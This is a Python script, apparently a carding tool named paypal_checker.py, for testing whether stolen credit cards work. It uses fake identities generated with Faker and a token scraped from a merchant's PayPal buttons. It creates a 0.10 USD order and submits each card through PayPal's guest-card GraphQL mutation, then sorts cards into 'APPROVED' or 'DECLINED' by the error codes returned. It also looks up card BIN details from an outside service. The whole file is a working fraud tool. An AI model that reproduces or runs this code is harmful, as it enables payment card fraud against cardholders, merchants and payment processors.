#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import re
import random
import json
import os
import sqlite3
import aiohttp
from faker import Faker

# =========================================================
# FUNCIONES AUXILIARES (copiadas del script original)
# =========================================================

def card_parse(card_input):
    cc, month, year, cvv = re.split(r'\s*[|/]\s*|\s+', card_input.strip())
    month = month.zfill(2)
    year = f"20{year}" if len(year) == 2 else year
    cctype = {"4": "Visa", "5": "MasterCard", "3": "American Express", "6": "Discover"}.get(cc[0])
    if cctype is None:
        raise Exception("Invalid cctype")
    return cc, month, year, cvv, cctype

def get_bin_info(cc):
    bin_number = cc[:6]
    try:
        # Intentamos primero la base de datos local (si existe)
        # En este ejemplo, usamos la API pública por simplicidad
        import requests
        req = requests.get(f"http://bins.antipublic.cc/bins/{bin_number}", timeout=5).json()
        bank_val = req.get("bank")
        return {
            "brand": req.get("brand", "N/A"),
            "country": req.get("country_name", "N/A"),
            "flag": req.get("country_flag", ""),
            "type": req.get("type", "N/A"),
            "level": req.get("level", "N/A"),
            "bin": req.get("bin", bin_number),
            "bank": bank_val if bank_val is not None else "N/A"
        }
    except:
        return {
            "brand": "N/A", "country": "N/A", "flag": "",
            "type": "N/A", "level": "N/A", "bin": bin_number, "bank": "N/A"
        }

# =========================================================
# FUNCIÓN PRINCIPAL PAYPAL (async)
# =========================================================

async def paypal_charge(card):
    """Procesa una tarjeta con PayPal (0.10 USD) y devuelve (status, mensaje)"""
    try:
        cc = card.strip().replace('/', '|').replace(":", "|")
        numc, mes, ano, cvv = cc.split('|')
        ano = "20"+ano if len(ano)==2 else ano
        mes = "0"+mes if len(mes)==1 else mes
        
        # Generar datos falsos
        fake = Faker("en_US")
        email = fake.email()
        nombre_completo = fake.name()
        first_name = nombre_completo.split()[0]
        last_name = " ".join(nombre_completo.split()[1:]) if len(nombre_completo.split()) > 1 else "Doe"
        postal = fake.postcode()
        phone = fake.phone_number()[:10]
        
        # URL inicial para obtener el token de facilitador
        url_inicial = 'https://www.paypal.com/smart/buttons?style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&style.shouldApplyRebrandedStyles=false&style.isButtonColorABTestMerchant=false&style.isPayNowOrLaterLabelEligible=false&style.shouldApplyPayNowOrLaterLabel=false&style.requestedButtonColor=gold&style.brandVersion=v1&allowBillingPayments=true&applePaySupport=false&buttonSessionID=uid_43ff635940_mdy6nte6mza&buttonSize=medium&customerId=&clientID=AXGz3gL7tUsVopYLol7Js1cInn3msFCBjNlxwQEvk5pFGGOksCRTCgXqlsZi1mt69QNnrXhDSvdQw86P&clientMetadataID=uid_0c5caea5ce_mdy6mzi6mjg&commit=true&components.0=buttons&currency=MXN&debug=false&disableSetCookie=true&eagerOrderCreation=false&env=production&experiment.enableVenmo=false&experiment.venmoVaultWithoutPurchase=false&experiment.spbEagerOrderCreation=false&experiment.venmoWebEnabled=false&experiment.isWebViewEnabled=false&experiment.isPaypalRebrandABTestEnabled=false&experiment.defaultBlueButtonColor=defaultBlue_darkBlue&experiment.isEdgeCacheStaleEnabled=false&experiment.isJunoCircuitBreakerEnabled=false&experiment.venmoEnableWebOnNonNativeBrowser=false&experiment.paypalCreditButtonCreateVaultSetupTokenExists=false&experiment.isPaylaterCobrandedLabelEnabled=false&experiment.isPaylaterCobrandedLabelRandomizationEnabled=true&experiment.isBfcacheEnabled=false&experiment.isPaypalRebrandEnabled=false&flow=purchase&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjp0cnVlLCJpbnN0YWxsbWVudHMiOmZhbHNlLCJ2ZW5kb3JzIjp7InZpc2EiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hc3RlcmNhcmQiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImFtZXgiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpc2NvdmVyIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJoaXBlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2V9LCJlbG8iOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJqY2IiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJtYWVzdHJvIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJkaW5lcnMiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImN1cCI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiY2JfbmF0aW9uYWxlIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzZXBhIjp7ImVsaWdpYmxlIjpmYWxzZX0sImlkZWFsIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJhbmNvbnRhY3QiOnsiZWxpZ2libGUiOmZhbHNlfSwiZ2lyb3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJlcHMiOnsiZWxpZ2libGUiOmZhbHNlfSwic29mb3J0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm15YmFuayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwMjQiOnsiZWxpZ2libGUiOmZhbHNlfSwid2VjaGF0cGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBheXUiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmxpayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ0cnVzdGx5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm94eG8iOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0b2JhbmNhcmlvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1lcmNhZG9wYWdvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm11bHRpYmFuY28iOnsiZWxpZ2libGUiOmZhbHNlfSwic2F0aXNwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGFpZHkiOnsiZWxpZ2libGUiOmZhbHNlfX0&intent=capture&locale.country=MX&locale.lang=es&hasShippingCallback=false&platform=mobile&renderedButtons.0=paypal&renderedButtons.1=card&sessionID=uid_0c5caea5ce_mdy6mzi6mjg&sdkCorrelationID=prebuild&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVhHejNnTDd0VXNWb3BZTG9sN0pzMWNJbm4zbXNGQ0JqTmx4d1FFdms1cEZHR09rc0NSVENnWHFsc1ppMW10NjlRTm5yWGhEU3ZkUXc4NlAmY3VycmVuY3k9TVhOIiwiYXR0cnMiOnsiZGF0YS11aWQiOiJ1aWRfaXlyZnFrcmRqcnJma211aXNlamxqZnJkY2NscHpmIn19&sdkVersion=5.0.560&storageID=uid_5986cd21d9_mdy6mzi6mjg&buttonColor.shouldApplyRebrandedStyles=false&buttonColor.color=gold&buttonColor.isButtonColorABTestMerchant=false&buttonColor.brandVersion=v1&supportedNativeBrowser=true&supportedNativeVenmoBrowser=true&supportsPopups=true&supportsVenmoPopups=true&vault=false&userAgent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0'
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "es-MX,es;q=0.7",
            "Sec-GPC": "1",
        }
        async with aiohttp.ClientSession() as session:
            # Request 1: Obtener facilitatorAccessToken
            async with session.get(url_inicial, headers=headers) as resp1:
                html = await resp1.text()
                start = html.find('"facilitatorAccessToken":"') + len('"facilitatorAccessToken":"')
                end = html.find('"', start)
                if start == -1 or end == -1:
                    return "Error! 💥", "No se encontró token de facilitador"
                facilitator_token = html[start:end]
            
            # Request 2: Crear orden
            headers2 = headers.copy()
            headers2["Authorization"] = f"Bearer {facilitator_token}"
            headers2["Content-Type"] = "application/json"
            data_order = {
                "intent": "CAPTURE",
                "purchase_units": [{
                    "description": "Payment for Donate or pay any Amount",
                    "amount": {"value": 0.10, "currency_code": "USD"}
                }],
                "payer": {
                    "email_address": email,
                    "name": {"name": nombre_completo},
                    "address": {"address_line_1": None, "address_line_2": None, "postal_code": None, "country_code": "MX"}
                },
                "application_context": {"shipping_preference": "NO_SHIPPING"}
            }
            async with session.post('https://www.paypal.com/v2/checkout/orders', headers=headers2, json=data_order) as resp2:
                order_json = await resp2.json()
                order_id = order_json.get('id')
                if not order_id:
                    return "Error! 💥", "No se pudo crear la orden"
            
            # Request 3: Obtener integrityToken
            url_cardfields = f'https://www.paypal.com/smart/card-fields?token={order_id}&sessionID=uid_0c5caea5ce_mdy6mzi6mjg&buttonSessionID=uid_43ff635940_mdy6nte6mza&locale.x=es_MX&commit=true&style.submitButton.display=true&hasShippingCallback=false&env=production&country.x=MX&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVhHejNnTDd0VXNWb3BZTG9sN0pzMWNJbm4zbXNGQ0JqTmx4d1FFdms1cEZHR09rc0NSVENnWHFsc1ppMW10NjlRTm5yWGhEU3ZkUXc4NlAmY3VycmVuY3k9TVhOIiwiYXR0cnMiOnsiZGF0YS11aWQiOiJ1aWRfaXlyZnFrcmRqcnJma211aXNlamxqZnJkY2NscHpmIn19&disable-card='
            async with session.get(url_cardfields, headers=headers) as resp3:
                html3 = await resp3.text()
                start = html3.find('"integrityToken":"') + len('"integrityToken":"')
                end = html3.find('"', start)
                if start == -1 or end == -1:
                    return "Error! 💥", "No se encontró integrityToken"
                integrity_token = html3[start:end]
            
            # Request 4: GraphQL payWithCard
            headers4 = headers.copy()
            headers4["Authorization"] = f"Bearer {facilitator_token}"
            headers4["Content-Type"] = "application/json"
            query = """
            mutation payWithCard(
                $token: String!
                $card: CardInput
                $paymentToken: String
                $phoneNumber: String
                $firstName: String
                $lastName: String
                $shippingAddress: AddressInput
                $billingAddress: AddressInput
                $email: String
                $currencyConversionType: CheckoutCurrencyConversionType
                $installmentTerm: Int
                $identityDocument: IdentityDocumentInput
                $feeReferenceId: String
                $integrityToken: String
            ) {
                approveGuestPaymentWithCreditCard(
                    token: $token
                    card: $card
                    paymentToken: $paymentToken
                    phoneNumber: $phoneNumber
                    firstName: $firstName
                    lastName: $lastName
                    email: $email
                    shippingAddress: $shippingAddress
                    billingAddress: $billingAddress
                    currencyConversionType: $currencyConversionType
                    installmentTerm: $installmentTerm
                    identityDocument: $identityDocument
                    feeReferenceId: $feeReferenceId
                    integrityToken: $integrityToken
                ) {
                    flags {
                        is3DSecureRequired
                    }
                    cart {
                        intent
                        cartId
                        buyer {
                            userId
                            auth {
                                accessToken
                            }
                        }
                        returnUrl {
                            href
                        }
                    }
                    paymentContingencies {
                        threeDomainSecure {
                            status
                            method
                            redirectUrl {
                                href
                            }
                            parameter
                        }
                    }
                }
            }
            """
            # Detectar tipo de tarjeta según el primer dígito
            card_type_map = {
                '4': 'VISA',
                '5': 'MASTER_CARD',
                '3': 'AMERICAN_EXPRESS',
                '6': 'DISCOVER'
            }
            card_type = card_type_map.get(numc[0], 'MASTER_CARD')
            variables = {
                "token": order_id,
                "card": {
                    "cardNumber": numc,
                    "type": card_type,
                    "expirationDate": f"{mes}/{ano}",
                    "postalCode": postal,
                    "securityCode": cvv
                },
                "phoneNumber": phone,
                "firstName": first_name,
                "lastName": last_name,
                "billingAddress": {
                    "givenName": first_name,
                    "familyName": last_name,
                    "line1": None,
                    "line2": None,
                    "city": None,
                    "state": None,
                    "postalCode": postal,
                    "country": "MX"
                },
                "email": email,
                "currencyConversionType": "PAYPAL",
                "integrityToken": integrity_token,
            }
            payload = {
                "query": query,
                "variables": variables,
                "operationName": "payWithCard"
            }
            async with session.post('https://www.paypal.com/graphql?paywithcard', headers=headers4, json=payload) as resp4:
                result_json = await resp4.json()
                text_response = json.dumps(result_json)
                valid_indicators = ['is3DSecureRequired', 'OTP', 'INVALID_SECURITY_CODE', 'EXISTING_ACCOUNT_RESTRICTED', 'INVALID_BILLING_ADDRES']
                match = None
                for indicator in valid_indicators:
                    if indicator in text_response:
                        match = indicator
                        break
                if match:
                    return "APPROVED ✅", match
                elif "CARD_GENERIC_ERROR" in text_response:
                    return "DECLINED ❌", "CARD_GENERIC_ERROR"
                elif '"errors":' in text_response:
                    try:
                        error_msg = result_json['errors'][0]['message']
                        return "DECLINED ❌", error_msg
                    except:
                        return "DECLINED ❌", "GraphQL error"
                else:
                    return "APPROVED ✅", "Thanks for your payment"
    except Exception as e:
        return "Error! 💥", str(e)[:150]

# =========================================================
# FUNCIÓN MAIN PARA CONSOLA
# =========================================================

def main():
    import sys
    if len(sys.argv) < 2:
        print("Uso: python paypal_checker.py \"CC|MM|YY|CVV\"")
        print("Ejemplo: python paypal_checker.py \"4815153061705285|01|28|498\"")
        sys.exit(1)

    card_input = sys.argv[1].strip()
    print(f"🔍 Verificando tarjeta: {card_input}")

    try:
        cc, month, year, cvv, cctype = card_parse(card_input)
    except Exception as e:
        print(f"❌ Error al parsear la tarjeta: {e}")
        sys.exit(1)

    # Obtener info BIN
    bin_info = get_bin_info(cc)
    brand = bin_info.get("brand", "N/A")
    country = bin_info.get("country", "N/A")
    flag = bin_info.get("flag", "")
    level = bin_info.get("level", "N/A")
    type2 = bin_info.get("type", "N/A")
    bin_num = bin_info.get("bin", cc[:6])
    bank = bin_info.get("bank", "N/A")

    print("📋 Información de la tarjeta:")
    print(f"  • BIN: {bin_num}")
    print(f"  • Banco: {bank}")
    print(f"  • Marca: {brand} | {type2} | {level}")
    print(f"  • País: {country} {flag}")
    print(f"  • Tipo: {cctype}")
    print("\n⏳ Procesando con PayPal...")

    # Ejecutar función asíncrona
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        status, message = loop.run_until_complete(paypal_charge(card_input))
    except Exception as e:
        status = "Error! 💥"
        message = str(e)[:150]
    finally:
        loop.close()

    print("\n📊 Resultado:")
    print(f"  • Estado: {status}")
    print(f"  • Mensaje: {message}")

if __name__ == "__main__":
    main()